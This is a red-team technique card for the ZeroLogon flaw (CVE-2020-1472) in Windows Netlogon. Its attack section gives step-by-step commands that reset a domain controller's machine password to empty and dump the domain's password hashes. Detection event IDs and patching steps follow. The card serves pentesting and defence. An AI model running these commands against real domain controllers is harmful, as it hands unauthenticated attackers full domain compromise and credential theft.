# [PE-EXPLOIT-002]: ZeroLogon DC Compromise

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-EXPLOIT-002 |
| **MITRE ATT&CK v18.1** | [Exploitation of Remote Services (T1210)](https://attack.mitre.org/techniques/T1210/) |
| **Tactic** | Privilege Escalation / Lateral Movement |
| **Platforms** | Windows AD |
| **Severity** | **Critical** |
| **CVE** | **CVE-2020-1472** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** The Netlogon Remote Protocol (MS-NRPC) uses AES-CFB8 encryption but fails to randomize the Initialization Vector (IV), leaving it as all zeros. This allows an attacker to spoof the client credential by sending a zero-filled challenge/response. Specifically, an attacker can use this to call `NetrServerPasswordSet2` and set the Domain Controller's machine account password to an empty string (or known value), granting them Domain Admin rights.
- **Attack Surface:** Netlogon (TCP 135/Dynamic RPC).
- **Business Impact:** **Instant Domain Admin**. No credentials required (Unauthenticated).

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Network Access to DC.
- **Tools:**
    - [ZeroLogon-Auto](https://github.com/dirkjanm/CVE-2020-1472)
    - [Mimikatz](https://github.com/gentilkiwi/mimikatz)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Check Vulnerability**
```bash
python3 zerologon_tester.py DC01 192.168.1.10
```

**Step 2: Exploit (Reset Password)**
Sets the DC machine password to an empty string.
```bash
python3 set_empty_pw.py DC01 192.168.1.10
```

**Step 3: DCSync**
Dump hashes using the empty password.
```bash
secretsdump.py -just-dc -no-pass 'DOMAIN/DC01$@192.168.1.10'
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 AD Logs
| Source | Event | Filter Logic |
|---|---|---|
| **System** | 5805 / 5723 | Netlogon session failure. High volume suggests brute force attempts (part of the exploit). |
| **Security** | 4742 | Computer Account Changed. "Password Last Set" updated for the DC object itself by an anonymous or null session. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Patching:** Install August 2020 updates immediately.
*   **Enforcement:** Enable "Domain controller: Allow vulnerable Netlogon secure channel connections" = Disabled (Phase 2 enforcement).

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-RECON-001]
> **Next Logical Step:** [CA-UNSC-001] (DCSync)
